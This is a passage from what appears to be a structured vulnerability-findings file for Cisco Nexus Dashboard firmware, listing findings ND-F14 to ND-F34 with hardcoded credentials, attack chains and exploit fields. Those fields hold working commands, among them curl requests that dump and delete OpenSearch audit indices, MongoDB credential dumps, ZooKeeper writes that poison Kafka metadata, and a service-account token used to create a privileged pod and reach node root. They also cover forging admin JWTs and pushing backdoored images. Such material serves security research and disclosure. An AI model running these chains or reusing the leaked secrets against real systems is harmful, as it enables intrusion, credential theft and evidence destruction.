            "ucs-c225m6-huu-4.2.2f (UCS C225M6 HUU firmware 4.2.2f)",
            "qemu (QEMU VM)",
        ],
        "policy_dir": "signdata/policy-2/<pcr-hash>/",
        "policy_files": ["tpm_luks.policy.signed", "tpm_passwd.policy.signed", "pcr_prod.bin", "pcr_tpm.bin", "pcr_limited.bin"],
        "format_doc": "aci-github.cisco.com/atom/atomix/blob/master/docs/sb/signdata-format.md",
        "chain": (
            "ND-F06 CI pivot -> exfiltrate snakeoil/dev private keys from Jenkins -> "
            "sign LUKS unlock request for UCS C225M6 hardware -> "
            "physical appliance storage accessible offline"
        ),
    },
    "ND-F16": {
        "title": "confd Debug API at /api/debug/* — Trusted CA Injection + Device Credential Harvest",
        "severity": "HIGH",
        "component": "confd Go binary, port 19999 TLS, /api/debug/* endpoints",
        "description": (
            "confd (ND configuration daemon) binds to 0.0.0.0:19999 with TLS and exposes "
            "all management endpoints under the path prefix /api/debug/. "
            "The 'debug' prefix in production API paths is a strong indicator of reduced "
            "authentication controls. Key endpoints: "
            "(1) POST /api/debug/ndtrustedcas — inject custom CA certificate as "
            "'ND Trusted CA'; requires only name + cert PEM; propagates via Kafka to "
            "all ND services that validate TLS against ND's trust store; "
            "(2) POST /api/debug/addapikey — add API key for managed network device "
            "(deviceUserName = ACI fabric / Nexus switch credential); "
            "(3) GET /api/debug/class/ndtrustedcas — enumerate all trusted CAs; "
            "(4) GET /api/debug/apikeysbyname — retrieve existing device API keys. "
            "confd uses MongoDB as its backend and Kafka for event distribution — "
            "an injected trusted CA propagates cluster-wide. "
            "All schemas have additionalProperties: true — likely permissive parsing."
        ),
        "port": 19999,
        "bind": "0.0.0.0",
        "tls": True,
        "backend": "mongodb.mongodb.svc:27017",
        "transport": "kafka (confd-topic)",
        "debug_endpoints": {
            "POST /api/debug/ndtrustedcas": "inject trusted CA cert cluster-wide",
            "GET /api/debug/class/ndtrustedcas": "list all trusted CAs",
            "POST /api/debug/addapikey": "add API key for managed device",
            "POST /api/debug/bulkaddapikey": "bulk add device API keys",
            "GET /api/debug/apikeysbyname": "retrieve device API keys by name",
            "POST /api/debug/devusers": "manage device user RBAC",
            "POST /api/debug/imports": "import full ND configuration",
            "GET /api/debug/exports": "export full ND configuration",
            "POST /api/debug/apigwjwt": "modify API gateway JWT signing keys",
        },
        "attack": (
            "1. Reach confd:19999 from cluster network (mTLS required — confirmed by ND-F03 chain: etcd bypass → cert exfil → client cert → confd); "
            "2. POST /api/debug/ndtrustedcas with attacker CA -> all ND services trust attacker certs; "
            "3. Issue certs signed by attacker CA -> impersonate any ND microservice; "
            "4. Alternate: GET /api/debug/apikeysbyname -> harvest credentials for managed ACI/Nexus devices"
        ),
        "chain": "ND-F03 mTLS cert -> confd debug API -> CA injection -> cluster-wide mTLS bypass",
    },
    "ND-F14": {
        "title": "apigw entrypoint.sh Logs Tyk Admin Secret to /logs/launcher.log at Every Startup",
        "severity": "HIGH",
        "component": "apigw container entrypoint.sh",
        "description": (
            "The apigw container entrypoint (/usr/bin/entrypoint.sh) extracts the Tyk admin "
            "secret from /pdata/tyk.conf and logs it to /logs/launcher.log on every container "
            "startup: "
            "secret=$(grep -Po '\"secret\":.*?[^\\\\]\",' /pdata/tyk.conf) && "
            "log \"APIGW Mgr ready, secret: $secret\". "
            "The /logs volume is shared across ND containers and accessible via "
            "acs techsupport bundle collection. Any operator or attacker with log read access "
            "obtains the live Tyk admin secret. Combined with ND-F11 (default secret unchanged), "
            "this provides a second independent path to the Tyk admin API: "
            "log exfiltration yields the same '352d20ee67be67f6340b4c0605b044b7' value "
            "or any rotation the operator made, revealing the actual production secret "
            "if it was changed from the default."
        ),
        "log_path": "/logs/launcher.log",
        "log_line": "log \"APIGW Mgr ready, secret: $secret\"",
        "secret_source": "/pdata/tyk.conf (persistent data volume, written by APIGWMGR on :30026)",
        "access_paths": [
            "acs techsupport collect -> download tech-support bundle -> extract launcher.log",
            "Any container with /logs volume mount read access",
            "ND-F01 cookie -> keyhole techsupport endpoint -> log bundle",
        ],
        "chain": "ND-F01 cookie -> GET /keyhole/api/v1/techsupport -> launcher.log -> live Tyk admin secret",
    },
    "ND-F19": {
        "title": "MinIO Hardcoded Access Key + Secret Derived from TLS Private Key Line",
        "severity": "HIGH",
        "component": "infra/minio container (minio.sh entrypoint)",
        "description": (
            "minio.sh hardcodes MINIO_ACCESS_KEY='minio-nd-access-key' (same across all ND "
            "deployments). The secret key (MINIO_SECRET_KEY) derives from line 2 of "
            "/minio/certs/private.key via 'sed 2q;d /minio/certs/private.key' — the first "
            "base64-encoded content line of the TLS PEM private key. This is identical across "
            "all ND clusters using the same provisioning, since the TLS cert is generated "
            "during initial setup. "
            "Fallback paths: (1) /minio/data/secret.key — persisted after first derivation, "
            "readable by any process on the minio pod; (2) K8s ConfigMap 'minio-access-key' "
            ".data['initkey'] — readable by any service account with ConfigMap read in the "
            "minio namespace. "
            "The hardcoded access key + derivable secret key gives full MinIO access to all "
            "ND object storage: backup data, logs, configuration exports, and any uploaded "
            "firmware blobs. "
            "Chain with ND-F17/ND-F18: confd /api/debug/passphraseresp exposes TLS key "
            "material context; ND-F01 cookie -> keyhole -> log bundle may contain "
            "/minio/certs/private.key references or the secret.key value."
        ),
        "minio_access_key": "minio-nd-access-key",
        "secret_derivation": "sed '2q;d' /minio/certs/private.key (line 2 of TLS private key PEM)",
        "fallback_paths": [
            "/minio/data/secret.key (persisted after first run)",
            "K8s ConfigMap 'minio-access-key' .data['initkey'] (namespace: minio)",
        ],
        "minio_port": 9000,
        "storage_contents": "ND backups, firmware blobs, logs, configuration exports",
        "chain": "ND-F17 confd TLS cert exposure -> derive MinIO secret -> MinIO API full access",
    },
    "ND-F20": {
        "title": "MinIO Prometheus Metrics Endpoint Unauthenticated — Storage Layout Disclosure",
        "severity": "MEDIUM",
        "component": "infra/minio container (minio.sh, MINIO_PROMETHEUS_AUTH_TYPE=public)",
        "description": (
            "minio.sh sets MINIO_PROMETHEUS_AUTH_TYPE='public', removing all authentication "
            "from the MinIO Prometheus metrics endpoint. "
            "GET /minio/prometheus/metrics (or /metrics on the MinIO metrics port) returns "
            "bucket names, object counts, total storage used, request rates, and error rates "
            "for all ND-managed object stores — without credentials. "
            "Exposed data includes: bucket topology (exposing application-layer separation), "
            "object count per bucket (reveals volume of backup/log data), storage utilization "
            "(infrastructure mapping). "
            "Combined with ND-F19 (known access key), the metrics endpoint confirms which "
            "buckets exist before attempting full data access."
        ),
        "env_var": "MINIO_PROMETHEUS_AUTH_TYPE=public",
        "endpoint": "GET /minio/prometheus/metrics",
        "port": 9000,
        "exposed_data": [
            "Bucket names (application topology inference)",
            "Object counts per bucket",
            "Total storage utilization",
            "Request/error rates (operational fingerprint)",
        ],
        "chain": "ND-F20 bucket enum -> ND-F19 cred derivation -> full MinIO exfil",
    },
    "ND-F21": {
        "title": "OpenSearch Anonymous Auth Mapped to all_access — Unauthenticated Full Cluster Admin",
        "severity": "CRITICAL",
        "component": "infra/opensearch container (config.yml, roles_mapping.yml)",
        "description": (
            "The OpenSearch security plugin config.yml shipped in ND firmware sets "
            "'anonymous_auth_enabled: true'. The roles_mapping.yml maps "
            "'opendistro_security_anonymous_backendrole' (the anonymous user's backend role) "
            "to 'all_access' (the OpenSearch superuser role). "
            "Result: any unauthenticated HTTP request to OpenSearch port 9200 is processed "
            "with full cluster admin privileges. No credentials required. "
            "This is confirmed by security_provision.sh which runs curl against OpenSearch "
            "_cluster/settings with no authentication headers — the script works because "
            "anonymous auth grants all_access. "
            "ND uses OpenSearch as the backend for: NIR telemetry/anomaly analysis, "
            "audit logs, event correlation, NDFC fabric state data. Full read access "
            "exposes network topology, traffic patterns, and security audit trails. "
            "Full write access allows index deletion, data tampering, and log erasure "
            "to cover attacker activity. "
            "The security config is pushed cluster-wide by security_provision.sh via "
            "securityadmin.sh using TLS admin cert at "
            "/opt/opensearch/config/certs/admin/admin-key.pem — this second path "
            "(cert forgery via ND-F03/ND-F04 etcd bypass) also yields full securityadmin access."
        ),
        "port": 9200,
        "protocol": "HTTPS",
        "anonymous_auth": True,
        "anonymous_role": "all_access",
        "config_file": "infra/opensearch/securityconfig/config.yml",
        "roles_mapping": "infra/opensearch/securityconfig/roles_mapping.yml",
        "data_at_risk": [
            "NIR telemetry and network anomaly analysis data",
            "ND audit logs (user actions, API calls, auth events)",
            "NDFC fabric event correlation data",
            "Network topology and traffic pattern time series",
        ],
        "exploit": (
            "curl -k https://<opensearch>:9200/_cat/indices?v  # no auth, returns all indices\n"
            "curl -k https://<opensearch>:9200/<index>/_search?pretty  # dump any index\n"
            "curl -k -XDELETE https://<opensearch>:9200/<audit_index>  # erase audit trail"
        ),
        "chain": "ND-F21 no-auth OpenSearch -> dump ND telemetry/audit -> log erasure (evidence destruction)",
    },
    "ND-F22": {
        "title": "MongoDB No Authentication — Direct Cluster DB Access via TLS-Only Connection",
        "severity": "CRITICAL",
        "component": "infra/mongodb container (mongod.yaml, entrypoint.sh)",
        "description": (
            "mongod.yaml ships without a 'security.authorization' field; "
            "entrypoint.sh only enables --auth when both MONGO_INITDB_ROOT_USERNAME "
            "and MONGO_INITDB_ROOT_PASSWORD environment variables are set. "
            "Neither env var is configured in ND's K8s manifests — MongoDB starts "
            "without authentication on every ND deployment. "
            "net.bindIpAll: true binds on 0.0.0.0:27017. TLS is required (requireTLS) "
            "but is server-only — no client certificate auth. The cluster CA cert "
            "(cacerts.crt, distributed to all ND services and exposed via confd "
            "/api/debug/ endpoints per ND-F16) is sufficient to connect. "
            "All common.sh _mongo_cmd* functions use --tls --tlsCAFile with no "
            "--username/--password args, confirming no auth is expected. "
            "Databases at risk: securitymgr (ACI/Nexus device credentials — ND-F18), "
            "confd (trusted CA certs, API keys, device RBAC — ND-F16), "
            "aaaserver (TrustedJWTKeys — ND-F10), "
            "apigw (Tyk API definitions, session tokens), "
            "all 22 MSO + 32 NDFC + 60 NIR application databases. "
            "Direct MongoDB access bypasses all HTTP API auth layers."
        ),
        "port": 27017,
        "bind": "0.0.0.0",
        "tls": "requireTLS (server-only, no client cert auth)",
        "auth_enabled": False,
        "databases_at_risk": [
            "securitymgr — ACI APIC admin passwords + Nexus device credentials",
            "confd — trusted CAs, API keys, device RBAC data",
            "aaaserver — TrustedJWTKeys (admin JWT forge surface)",
            "apigw — Tyk session tokens, API definitions",
            "MSO/NDFC/NIR application data (22+32+60 services)",
        ],
        "exploit": (
            "mongo --tls --tlsCAFile cacerts.crt --ipv6 --host mongodb.mongodb.svc:27017\n"
            "use securitymgr; db.credentials.find()  # dump ACI device passwords\n"
            "use confd; db.trustedcas.find()  # dump all cluster trusted CAs"
        ),
        "chain": "ND-F22 no-auth MongoDB -> securitymgr cred dump -> all ACI APIC admin passwords",
    },
    "ND-F23": {
        "title": "Kafka JAAS Hardcoded Credentials — SASL/PLAIN admin + ZooKeeper Universal Password",
        "severity": "CRITICAL",
        "component": "infra/kafka container (secure/kafka_server.jaas, secure/zk_server.conf)",
        "description": (
            "kafka_server.jaas ships two hardcoded credential blocks. "
            "KafkaServer block: org.apache.kafka.common.security.plain.PlainLoginModule "
            "with username='admin', password='admin-secret', user_admin='admin-secret' — "
            "identical on all ND deployments. "
            "Client block: org.apache.zookeeper.server.auth.DigestLoginModule "
            "with username='apic', password='LF9DS0MCP282VGL1' — the ZooKeeper "
            "client credential used by the Kafka broker to authenticate to ZooKeeper. "
            "zk_server.conf amplifies the exposure: the same password 'LF9DS0MCP282VGL1' "
            "is used for QuorumLearner (zkpeer) AND the Server user_apic entry — "
            "a single static password controls both ZK quorum membership and "
            "all ZK client auth. These credentials are static across all ND deployments; "
            "obtaining them from any ND image (ND-F01 log bundle) provides ZK auth "
            "for every deployed ND cluster."
        ),
        "kafka_sasl_plain": {
            "username": "admin",
            "password": "admin-secret",
        },
        "zookeeper_digest": {
            "username": "apic",
            "password": "LF9DS0MCP282VGL1",
        },
        "zookeeper_quorum_peer_password": "LF9DS0MCP282VGL1",
        "port_kafka": 9092,
        "port_zookeeper": 2181,
        "jaas_path": "/secure/kafka_server.jaas",
        "zk_conf_path": "/secure/zk_server.conf",
        "exploit": (
            "# Kafka SASL (if SASL_SSL listener active):\n"
            "# kafka-console-consumer.sh --bootstrap-server kafka:9092 "
            "--consumer.config sasl.properties --topic <topic>\n"
            "# sasl.properties: security.protocol=SASL_SSL, sasl.mechanism=PLAIN, "
            "username=admin, password=admin-secret\n"
            "# ZooKeeper direct access:\n"
            "# JVMFLAGS='-Djava.security.auth.login.config=client_jaas.conf' "
            "zkCli.sh -server zookeeper:2181\n"
            "# ls /brokers/topics  # enumerate all Kafka topics\n"
            "# ls /admin/delete_topics  # queue topic deletion"
        ),
        "chain": "ND-F23 ZK cred -> ZK direct access -> Kafka cluster metadata manipulation (ND-F24)",
    },
    "ND-F24": {
        "title": "ZooKeeper ACL Disabled — Authenticated Clients Have Unrestricted ZK Tree Access",
        "severity": "HIGH",
        "component": "infra/kafka container (start-kafka-k8s.sh broker startup args)",
        "description": (
            "start-kafka-k8s.sh passes --override zookeeper.set.acl=false to the Kafka broker. "
            "When set to false, the broker does not set ACLs on ZooKeeper znodes — "
            "all Kafka metadata nodes in ZooKeeper (topics, brokers, ACLs, controller "
            "election, consumer groups) are created without access restrictions. "
            "Any client that can authenticate to ZooKeeper (credential in ND-F23) "
            "can read and write all Kafka metadata without being the broker. "
            "Attack surface: read all topic configs and consumer group offsets; "
            "write to /admin/delete_topics to queue arbitrary topic deletion; "
            "manipulate /brokers/ids to poison broker registration; "
            "write to /config/topics/<topic> to modify retention/compaction configs. "
            "The custom APIC authorizer (com.cisco.aci.bird.kafka.authorizer.KafkaAuthorizer "
            "with SQLite backend) stores its policy in ZK — ACL policy can be overwritten "
            "directly via ZK client without going through the Kafka admin API."
        ),
        "zookeeper_set_acl": False,
        "authorizer": "com.cisco.aci.bird.kafka.authorizer.KafkaAuthorizer",
        "principal_builder": "com.cisco.aci.bird.kafka.authorizer.PrincipalBuilder",
        "exploit": (
            "# With ND-F23 ZK creds, connect directly:\n"
            "# zkCli.sh -server zookeeper:2181 (authenticated via JAAS)\n"
            "# set /brokers/topics/<sensitive_topic>/partitions/0/state {leader: -1}  "
            "# poison partition leader -> DoS\n"
            "# set /config/topics/__consumer_offsets {cleanup.policy: delete, retention.ms: 0}  "
            "# purge consumer offset history\n"
            "# get /kafka-acl/Topic/<topic>  # dump raw ACL JSON\n"
            "# set /kafka-acl/Topic/<topic> ...  # overwrite ACL to grant any principal"
        ),
        "chain": "ND-F23 ZK auth -> ND-F24 no-ACL ZK -> full Kafka cluster metadata write",
    },
    "ND-F25": {
        "title": "OIDC JWT RSA Signing Key on Host Filesystem — hostPath Mount Exposes Cluster JWT Authority",
        "severity": "CRITICAL",
        "component": "authy-oidc container (oidc.bin), hostPath mount from /data/services/kms_etcd/keys/v1/se/",
        "description": (
            "The authy-oidc container mounts JWT signing keys from the HOST filesystem via a "
            "Kubernetes hostPath volume: path=/data/services/kms_etcd, subPath=keys/v1/se. "
            "The JWT RSA private key (rsa.priv), public key (rsa.pub), and API signing key (api.key) "
            "are present at /data/services/kms_etcd/keys/v1/se/ on the host. "
            "These keys are used to issue JWTs for all ND OIDC authentication. "
            "Any process with read access to the host filesystem at that path — via ND-F01 keyhole, "
            "ND-F03 KMS etcd noauth, or any container with a hostPath or hostVolume mount — "
            "can extract rsa.priv and forge a JWT for any user including admin."
        ),
        "surface": "Host filesystem at /data/services/kms_etcd/keys/v1/se/rsa.priv",
        "key_paths": {
            "rsa_priv": "/data/services/kms_etcd/keys/v1/se/rsa.priv",
            "rsa_pub": "/data/services/kms_etcd/keys/v1/se/rsa.pub",
            "api_key": "/data/services/kms_etcd/keys/v1/se/api.key",
        },
        "mount_type": "hostPath (direct host filesystem, not a K8s secret)",
        "env_vars": {
            "JWT_PRIVATE_KEY_PATH": "/jwtcreds/rsa.priv",
            "JWT_PUBLIC_KEY_PATH": "/jwtcreds/rsa.pub",
            "JWT_API_KEY_PATH": "/jwtcreds/api.key",
        },
        "impact": (
            "rsa.priv extraction -> forge JWT for admin user -> full API access to all ND services "
            "behind /sedgeapi/ APIGW (MSO, NDFC, NIR, licensemgr, aaaserver, etc.)"
        ),
        "lateral_path": (
            "ND-F01 or ND-F03 -> read /data/services/kms_etcd/keys/v1/se/rsa.priv "
            "-> forge JWT {'sub': 'admin', 'role': 'Domain-Admin'} "
            "-> call any APIGW endpoint with authType: jwt -> full ND cluster control"
        ),
        "chain": "ND-F01 keyhole OR ND-F03 etcd -> extract JWT rsa.priv -> forge admin JWT -> all APIGW endpoints",
    },
    "ND-F26": {
        "title": "storaged and bootstrap TLS Private Keys on Shared KMS Host Path",
        "severity": "HIGH",
        "component": "storaged.bin (port 30010 TLS), agent.json (bootstrap TLS), /data/services/kms_etcd/certs/",
        "description": (
            "Multiple services load TLS server certificates and private keys from the shared host path "
            "/data/services/kms_etcd/certs/. storaged binds 0.0.0.0:30010 with server-key.pem "
            "from /data/services/kms_etcd/certs/v1/kubernetes/. The agent container loads "
            "TLS from /data/services/kms_etcd/certs/v1/bootstrap/. "
            "Same host-path read access (ND-F01, ND-F03) exposes all TLS server private keys "
            "for these services, enabling MitM of storage and bootstrap API traffic on an ND node."
        ),
        "surface": "Host filesystem /data/services/kms_etcd/certs/",
        "affected_services": {
            "storaged": {
                "port": 30010,
                "cert": "/data/services/kms_etcd/certs/v1/kubernetes/server-cert.pem",
                "key": "/data/services/kms_etcd/certs/v1/kubernetes/server-key.pem",
                "ca": "/data/services/kms_etcd/certs/v1/kubernetes/cacerts.crt",
            },
            "agent": {
                "cert": "/data/services/kms_etcd/certs/v1/bootstrap/ca-bundle.crt",
                "key": "/data/services/kms_etcd/certs/v1/bootstrap/server.key",
            },
        },
        "chain": "ND-F01 or ND-F03 -> read /data/services/kms_etcd/certs/ -> MitM storaged:30010 TLS",
    },
    "ND-F27": {
        "title": "Tech Support Bundle Sanitization Bypass — Inner .tar/.tgz Files Not Sanitized",
        "severity": "MEDIUM",
        "component": "logmgr log_sanitize.py (SECRETS=/mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt)",
        "description": (
            "log_sanitize.py sanitizes tech support bundles by scanning log files for lines matching "
            "secret patterns defined in sanitize-ts.txt. However, the sanitizer explicitly skips "
            "inner archive files: `if not (mem.name.endswith('.tar') or mem.name.endswith('.tgz'))`. "
            "Tech support bundles collected by keyhole (/api/v1/techsupport) contain nested .tar files "
            "from various services. Any secrets (credentials, tokens, certificates) stored inside "
            "inner archives will not be redacted and will be present in the exported bundle."
        ),
        "surface": "keyhole /api/v1/techsupport bundle collection",
        "sanitizer_path": "/mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt",
        "skipped_types": [".tar", ".tgz"],
        "dirs_sanitized": ["/logs", "/data/services/app_logs"],
        "bypass_condition": "secrets stored in *.tar or *.tgz archives within the bundle",
        "chain": "ND-F01 -> GET /keyhole/api/v1/techsupport -> bundle contains unsanitized inner .tar with credentials",
    },
    "ND-F28": {
        "title": "Kafka CruiseControl Admin Endpoint Unauthenticated — Self-Healing Disable and Kafka DoS",
        "severity": "MEDIUM",
        "component": "CruiseControl (infra-kafka, kafka namespaces), cruisecontrol.<ns>.svc:19090",
        "description": (
            "The Kafka CruiseControl admin endpoint at cruisecontrol.<namespace>.svc:19090/kafkacruisecontrol/admin "
            "accepts POST requests with no authentication. upgrade-helper kafka-fns calls this endpoint directly "
            "to disable goal-violation healing: "
            "POST cruisecontrol.kafka.svc:19090/kafkacruisecontrol/admin?disable_self_healing_for=GOAL_VIOLATION. "
            "Present in both kafka and infra-kafka namespaces on ND >= 2.3. "
            "An attacker with K8s pod network access or via SSRF can disable self-healing, "
            "leaving the Kafka cluster unmonitored, or POST malformed payloads to trigger CruiseControl instability."
        ),
        "surface": "CruiseControl REST API port 19090, accessible from K8s pod network",
        "endpoints": {
            "disable_healing": "POST /kafkacruisecontrol/admin?disable_self_healing_for=GOAL_VIOLATION",
            "status": "GET /kafkacruisecontrol/state",
        },
        "namespaces": ["kafka", "infra-kafka"],
        "auth": "none",
        "chain": "K8s pod network access -> POST cruisecontrol.kafka.svc:19090/kafkacruisecontrol/admin -> disable Kafka self-healing",
    },
    "ND-F29": {
        "title": "Zot OCI Registry No Authentication — Unauthenticated Image Pull and Push",
        "severity": "CRITICAL",
        "component": "Zot OCI registry (zot namespace), hostNetwork: true, port from GetSystemPort('RegistryPort')",
        "description": (
            "The Zot OCI registry config.tpl contains only storage, http (TLS), and log blocks. "
            "No 'auth' block is present. In Zot, omitting the auth block means the registry is fully "
            "open: any client can pull (docker pull) or push (docker push) without credentials. "
            "TLS IS enabled (server cert/key mounted from KMS), but authentication is absent — "
            "TLS provides encryption only, not access control. The registry runs with hostNetwork: true "
            "and listens on 0.0.0.0, making it reachable from any host-routable network. "
            "The OCI repo root is /data/oci_repo (hostPath mount), containing ALL ND service images "
            "including apigw, aaaserver, keyhole, kms, and all app containers. "
            "An attacker can push a poisoned image to any tag, then trigger a container restart or "
            "ND upgrade to execute arbitrary code in any ND service pod with its service account token."
        ),
        "registry_root": "/data/oci_repo",
        "config_path": "helm/config.tpl in zot container",
        "auth_block": None,
        "network": "hostNetwork: true, address: 0.0.0.0",
        "tls": "enabled (server cert from KMS path), no client cert required, no HTTP Basic/OIDC/ldap auth",
        "impact": (
            "Push poisoned image -> restart any ND service -> code exec in pod -> service account token "
            "-> if cisco-ndfc/mso/nir pod: cluster-admin (ND-F30). If apigw pod: full traffic intercept. "
            "If aaaserver/kms pod: PKI root takeover."
        ),
        "chain": "Zot no-auth -> push backdoored image tag -> restart target pod -> code exec -> service account cluster-admin (ND-F30)",
    },
    "ND-F30": {
        "title": "system:appmgr ClusterRole — Cluster-Admin Equivalent RBAC Bound to All App Namespace Service Accounts",
        "severity": "CRITICAL",
        "component": "appmgr Helm chart (helm/templates/appmgr.tpl), ClusterRole system:appmgr, ClusterRoleBinding appmgr",
        "description": (
            "The system:appmgr ClusterRole defines rules: apiGroups: ['*'], resources: ['*'], verbs: ['*']. "
            "This is mathematically identical to the built-in cluster-admin ClusterRole — every K8s API "
            "operation on every resource type in every namespace is permitted. "
            "The ClusterRoleBinding binds this role to four service account groups: "
            "system:serviceaccounts:appmgr, system:serviceaccounts:cisco-ndfc, "
            "system:serviceaccounts:cisco-mso, system:serviceaccounts:cisco-nir. "
            "Every pod deployed into these four namespaces has a pre-mounted service account token at "
            "/var/run/secrets/kubernetes.io/serviceaccount/token that carries cluster-admin. "
            "These namespaces contain 60+ containers: all NDFC microservices, all MSO services, "
            "all NIR telemetry services. Any code execution path in any of these pods grants "
            "cluster-admin over the entire K8s cluster."
        ),
        "clusterrole_rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}],
        "binding_subjects": [
            "system:serviceaccounts:appmgr",
            "system:serviceaccounts:cisco-ndfc",
            "system:serviceaccounts:cisco-mso",
            "system:serviceaccounts:cisco-nir",
        ],
        "exploit": (
            "From any cisco-ndfc/mso/nir/appmgr pod: "
            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); "
            "curl -k https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets "
            "-H 'Authorization: Bearer $TOKEN' -> lists kube-system secrets including etcd certs; "
            "kubectl --token=$TOKEN create namespace pwned; "
            "kubectl --token=$TOKEN create pod root --image=alpine --overrides='{spec:{hostPID:true,containers:[{securityContext:{privileged:true},volumeMounts:[{mountPath:/host,name:host}],volumes:[{hostPath:{path:/},name:host}]}]}}'  "
            "-> nsenter -t 1 -m -u -i -n /bin/bash -> root on K8s node"
        ),
        "chain": "Code exec in any cisco-ndfc/mso/nir/appmgr pod -> pre-mounted SA token = cluster-admin -> kube-system secrets -> node root",
        "combined_with": ["ND-F29", "ND-F03", "ND-F01"],
    },
    "ND-F31": {
        "title": "MSO Three Services Hardcoded DEBUG Log Level — APIC Site Creds + Fabric Push Ops + Schema Changes Logged",
        "severity": "HIGH",
        "component": "cisco-mso: msc-executionservice, msc-siteservice2, msc-schemaservice2",
        "description": (
            "Three MSO microservices set ENV_DEFAULT_LOG_LEVEL: 'debug' as hardcoded container env vars. "
            "The cisco-mso ConfigMap also sets loglevel: debug for the namespace. "
            "msc-executionservice: executes multi-site policy pushes — logs fabric authentication tokens, "
            "device credentials, and inter-site provisioning commands at DEBUG. "
            "msc-siteservice2 (siteservice:4.4.3.1018): manages MSO connections to remote APIC sites — "
            "stores and uses APIC controller admin credentials; DEBUG logging means site username/password "
            "for every connected APIC site appears in pod logs. Also has a LOG_TOKEN env var (log shipping token). "
            "msc-schemaservice2: handles ACI policy schema operations — DEBUG logs include policy "
            "object details, tenant configurations, and endpoint group credentials. "
            "All three log paths are accessible via kubectl logs -n cisco-mso or via the ND techsupport "
            "bundle (ND-F01 chain). These log levels are hardcoded in deployment specs — not runtime-configurable."
        ),
        "affected_services": {
            "msc-executionservice": "multi-site fabric policy push credentials",
            "msc-siteservice2": "APIC site admin credentials (username/password per connected APIC controller)",
            "msc-schemaservice2": "ACI policy schema data, tenant config",
        },
        "env_vars": {"ENV_DEFAULT_LOG_LEVEL": "debug"},
        "siteservice_extra": {"LOG_TOKEN": "log shipping token env var — potential credential for external log system"},
        "configmap": {"namespace": "cisco-mso", "loglevel": "debug"},
        "log_path": "/logs/cisco-mso/ (accessible via techsupport bundle, ND-F01)",
        "chain": "ND-F01 techsupport bundle -> /logs/cisco-mso/siteservice* -> APIC site admin credentials in DEBUG logs",
    },
    "ND-F32": {
        "title": "NDFC POAP Service in cisco-ndfc Namespace — Switch Provisioning Credentials in Debug Logs",
        "severity": "HIGH",
        "component": "cisco-ndfc / cmn-poap-svc (dcnm-poap-common.cisco-ndfc.svc:9443, dcnm-poap-data.cisco-ndfc.svc:9443)",
        "description": (
            "NDFC Power On Auto Provisioning (POAP) services expose three microservices: "
            "dcnm-poap-data.cisco-ndfc.svc:9443, dcnm-poap-mgmt.cisco-ndfc.svc:9443, "
            "dcnm-poap-common.cisco-ndfc.svc:9443. POAP is the zero-touch provisioning protocol "
            "for Nexus switch onboarding — it handles switch initial credentials, SSH keys, "
            "and bootstrap configurations. The NDFC configmap sets verbose logging for cmn-poap-svc, "
            "and the service runs with access to NDFC device credential stores. "
            "At debug log level, switch credentials (SSH username/password, SNMPv3 auth/priv keys) "
            "written during POAP provisioning flows appear in pod logs. "
            "POAP also listens on ports 443, 80, 69 (TFTP), and 22 (SSH) for switch connections, "
            "creating SSRF/redirect opportunities from POAP to internal services."
        ),
        "services": {
            "dcnm-poap-data": "cisco-ndfc.svc:9443",
            "dcnm-poap-mgmt": "cisco-ndfc.svc:9443",
            "dcnm-poap-common": "cisco-ndfc.svc:9443",
        },
        "protocols": ["HTTPS:443", "HTTP:80", "TFTP:69", "SSH:22"],
        "log_path": "/logs/cisco-ndfc/cmn-poap-svc* (accessible via techsupport bundle, ND-F01)",
        "chain": "ND-F01 techsupport bundle -> /logs/cisco-ndfc/cmn-poap-svc* -> switch bootstrap credentials in logs",
    },
    "ND-F33": {
        "title": "NDFC LAN Switch Credential Retrieval API — All Fabric Device Credentials via Forged JWT",
        "severity": "HIGH",
        "component": "cisco-ndfc APIGW routes (cisco-dcnm-apigw-lan.yml), dcnm LAN config service",
        "description": (
            "NDFC exposes credential retrieval endpoints under /api/v1/rest/lanconfig/ that return "
            "fabric switch credentials (SNMPv3, SSH, device passwords) to authenticated callers. "
            "These endpoints are documented in gen-network-admin-privileges-crd.yml as requiring "
            "network-admin role. All NDFC LAN APIGW routes use authType: jwt. "
            "With a forged JWT carrying Domain-Admin role (ND-F25: RSA private key from KMS hostPath), "
            "the Domain-Admin principal has network-admin-equivalent access and can call all credential "
            "retrieval endpoints: /get/rest/lanconfig/getlanswitchcredentials, "
            "/get/rest/lanconfig/getlanswitchcredentialswithtype, "
            "/get/rest/lanconfig/getswitchwritecredential/switchid, "
            "/get/rest/lanconfig/getrobotcredentials, /get/rest/lanconfig/getdefaultcredentials. "
            "This returns SSH credentials, SNMP strings, and device passwords for every fabric switch "
            "managed by NDFC — the complete device credential inventory."
        ),
        "endpoints": {
            "getlanswitchcredentials": "GET /api/v1/rest/lanconfig/getlanswitchcredentials",
            "getlanswitchcredentialswithtype": "GET /api/v1/rest/lanconfig/getlanswitchcredentialswithtype",
            "getswitchwritecredential": "GET /api/v1/rest/lanconfig/getswitchwritecredential/switchid",
            "getrobotcredentials": "GET /api/v1/rest/lanconfig/getrobotcredentials",
            "getdefaultcredentials": "GET /api/v1/rest/lanconfig/getdefaultcredentials",
            "getfabricswitchcredentials": "GET /api/v1/sancredential/getfabricswitchcredentials",
        },
        "auth_type": "jwt (authType: jwt on all NDFC LAN APIGW routes)",
        "required_role": "network-admin (superseded by Domain-Admin from forged JWT)",
        "chain": "ND-F25 forge JWT {role: Domain-Admin} -> GET /api/v1/rest/lanconfig/getlanswitchcredentials -> all fabric switch credentials",
        "combined_with": ["ND-F25", "ND-F01", "ND-F03"],
    },
    "ND-F34": {
        "title": "Dgraph Alpha No ACL Tokens — Unauthenticated GraphQL Queries via mTLS Client Cert",
        "severity": "HIGH",
        "component": "cisco-nir / dgraph-alpha-public.cisco-nir.svc ports 8080 (HTTP) and 9080 (gRPC)",
        "description": (
            "Dgraph Alpha is deployed as a single pod in cisco-nir namespace, "
            "service dgraph-alpha-public.cisco-nir.svc on ports 8080 (HTTP/GraphQL) and 9080 (gRPC). "
            "Dgraph startup args: ['start'] — no --security whitelist flag (IP allowlist) and "
            "no --acl_secret_file (HMAC ACL token). Node TLS certs are mounted (server.key/crt, ca.crt) "
            "providing transport security. Client-side: radix pod mounts "
            "/home/app/client_credentials/dgraph/client.key and client.crt, indicating mTLS is required. "
